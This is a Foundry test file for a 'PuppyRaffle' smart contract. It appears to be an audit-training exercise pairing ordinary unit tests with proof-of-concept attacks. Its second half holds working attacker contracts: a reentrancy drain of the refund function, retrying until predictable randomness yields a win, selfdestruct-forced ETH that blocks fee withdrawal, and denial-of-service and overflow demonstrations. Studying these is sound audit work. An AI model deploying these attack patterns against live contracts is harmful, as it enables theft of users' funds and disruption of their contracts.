// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }
}
contract ReentrancyAttacker {
    PuppyRaffle private immutable raffle;
    uint256 private immutable entranceFee;
    uint256 private immutable playerIndex;

    constructor(
        PuppyRaffle _raffle,
        uint256 _entranceFee,
        uint256 _playerIndex
    ) {
        raffle = _raffle;
        entranceFee = _entranceFee;
        playerIndex = _playerIndex;
    }

    function attack() external {
        address[] memory attackerEntry = new address[](1);
        attackerEntry[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(attackerEntry);
        raffle.refund(playerIndex);
    }

    receive() external payable {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(playerIndex);
        }
    }
}

contract SelectWinnerAttacker {
    PuppyRaffle private immutable raffle;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function attack() external {
        raffle.selectWinner();
        require(raffle.previousWinner() == address(this), "not winner; retry");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return 0x150b7a02;
    }

    receive() external payable {}
}

contract RejectingWinner {
    receive() external payable {
        revert("prize rejected");
    }
}

contract ForceSend {
    constructor() payable {}

    function forceSend(address payable target) external {
        selfdestruct(target);
    }
}

contract PuppyRaffleVulnerabilityTest is Test {
    PuppyRaffle private puppyRaffle;
    uint256 private constant ENTRANCE_FEE = 1 ether;
    uint256 private constant DURATION = 1 days;
    address private constant FEE_ADDRESS = address(99);
    address private constant PLAYER_ONE = address(1);
    address private constant PLAYER_TWO = address(2);
    address private constant PLAYER_THREE = address(3);
    address private constant PLAYER_FOUR = address(4);

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, DURATION);
    }

    function testReentrancy__refund() public {
        _enterFourPlayers();
        uint256 raffleBalanceBeforeAttack = address(puppyRaffle).balance;

        ReentrancyAttacker attacker = new ReentrancyAttacker(
            puppyRaffle,
            ENTRANCE_FEE,
            4
        );
        vm.deal(address(attacker), ENTRANCE_FEE);
        uint256 attackerBalanceBeforeAttack = address(attacker).balance;

        attacker.attack();

        assertEq(address(puppyRaffle).balance, 0);
        assertEq(
            address(attacker).balance,
            attackerBalanceBeforeAttack + raffleBalanceBeforeAttack
        );
    }

    function testPredictableRandomness__retryUntilAttackerWins() public {
        SelectWinnerAttacker attacker = new SelectWinnerAttacker(puppyRaffle);
        address[] memory players = new address[](4);
        players[0] = address(attacker);
        players[1] = PLAYER_ONE;
        players[2] = PLAYER_TWO;
        players[3] = PLAYER_THREE;
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        vm.warp(block.timestamp + DURATION + 1);

        for (uint256 attempt = 0; attempt < 100; attempt++) {
            try attacker.attack() {
                assertEq(puppyRaffle.previousWinner(), address(attacker));
                return;
            } catch {
                vm.warp(block.timestamp + 1);
                vm.roll(block.number + 1);
            }
        }

        fail("attacker did not obtain a favourable draw in 100 attempts");
    }

    function testDoSAttackOnEnterRaffle() public {
        uint256 numberOfPlayers = 2000;
        address[] memory players = new address[](numberOfPlayers);
        for (uint160 i = 0; i < numberOfPlayers; i++) {
            players[i] = address(i);
        }

        address attacker = address(10);
        vm.deal(attacker, 1e30);
        vm.prank(attacker);
        vm.expectRevert();
        puppyRaffle.enterRaffle{value: numberOfPlayers * ENTRANCE_FEE}(players);
    }

    function testOverflow__selectWinner() public {
        uint256 highEntranceFee = 200 ether;
        puppyRaffle = new PuppyRaffle(highEntranceFee, FEE_ADDRESS, DURATION);

        address[] memory players = new address[](4);
        for (uint256 i = 0; i < players.length; i++) {
            players[i] = address(uint160(i + 1));
        }
        uint256 cost = highEntranceFee * players.length;
        puppyRaffle.enterRaffle{value: cost}(players);

        vm.warp(block.timestamp + DURATION + 1);
        puppyRaffle.selectWinner();

        uint256 expectedFee = (cost * 20) / 100;
        assertLt(uint256(puppyRaffle.totalFees()), expectedFee);
        assertEq(
            uint256(puppyRaffle.totalFees()),
            expectedFee % (uint256(type(uint64).max) + 1)
        );
    }

    function testForcedEth__blocksFeeWithdrawal() public {
        _enterFourPlayers();
        vm.warp(block.timestamp + DURATION + 1);
        puppyRaffle.selectWinner();

        ForceSend forceSend = new ForceSend{value: 1 wei}();
        forceSend.forceSend(payable(address(puppyRaffle)));

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testRefund__preventsRoundSettlement() public {
        _enterFourPlayers();
        vm.prank(PLAYER_ONE);
        puppyRaffle.refund(0);

        vm.warp(block.timestamp + DURATION + 1);
        for (uint256 attempt = 0; attempt < 100; attempt++) {
            // Avoid index zero, whose zero-address mint would obscure the
            // insufficient-prize failure caused by the refunded entry.
            if (_winnerIndex(address(this)) != 0) {
                vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
                puppyRaffle.selectWinner();
                return;
            }
            vm.warp(block.timestamp + 1);
        }

        fail("could not select an active winner");
    }

    function testRejectingWinner__blocksDrawFinalization() public {
        RejectingWinner rejectingWinner = new RejectingWinner();
        address[] memory players = new address[](4);
        players[0] = address(rejectingWinner);
        players[1] = PLAYER_ONE;
        players[2] = PLAYER_TWO;
        players[3] = PLAYER_THREE;
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        vm.warp(block.timestamp + DURATION + 1);
        for (uint256 attempt = 0; attempt < 100; attempt++) {
            if (_winnerIndex(address(this)) == 0) {
                vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
                puppyRaffle.selectWinner();
                return;
            }
            vm.warp(block.timestamp + 1);
        }

        fail("could not select the rejecting winner");
    }

    function testGetActivePlayerIndex__cannotDistinguishAbsentPlayerFromIndexZero()
        public
    {
        address[] memory players = new address[](1);
        players[0] = PLAYER_ONE;
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(PLAYER_ONE), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(address(123)), 0);
    }

    function testRarityThresholds__mintSeventyOnePercentCommonAndFourPercentLegendary()
        public
    {
        uint256 commonOutcomes;
        uint256 rareOutcomes;
        uint256 legendaryOutcomes;
        for (uint256 rarity = 0; rarity < 100; rarity++) {
            if (rarity <= puppyRaffle.COMMON_RARITY()) {
                commonOutcomes++;
            } else if (rarity <= puppyRaffle.COMMON_RARITY() + puppyRaffle.RARE_RARITY()) {
                rareOutcomes++;
            } else {
                legendaryOutcomes++;
            }
        }

        assertEq(commonOutcomes, 71);
        assertEq(rareOutcomes, 25);
        assertEq(legendaryOutcomes, 4);
    }

    function _enterFourPlayers() private {
        address[] memory players = new address[](4);
        players[0] = PLAYER_ONE;
        players[1] = PLAYER_TWO;
        players[2] = PLAYER_THREE;
        players[3] = PLAYER_FOUR;
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
    }

    function _winnerIndex(address caller) private view returns (uint256) {
        return
            uint256(
                keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))
            ) % 4;
    }
}
